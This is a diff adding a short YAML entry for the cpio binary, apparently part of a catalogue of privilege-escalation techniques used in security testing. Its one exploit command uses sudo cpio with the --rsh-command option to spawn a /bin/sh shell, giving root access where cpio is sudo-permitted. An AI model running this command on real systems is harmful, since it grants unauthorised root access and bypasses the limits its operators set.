@@ -1,0 +1,5 @@
+name: cpio
+binary_path: /usr/bin/cpio
+exploit_cmds:
+- 'cd /tmp && echo ''/bin/sh </dev/tty >/dev/tty'' >localhost && sudo /usr/bin/cpio
+  -o --rsh-command /bin/sh -F localhost:'
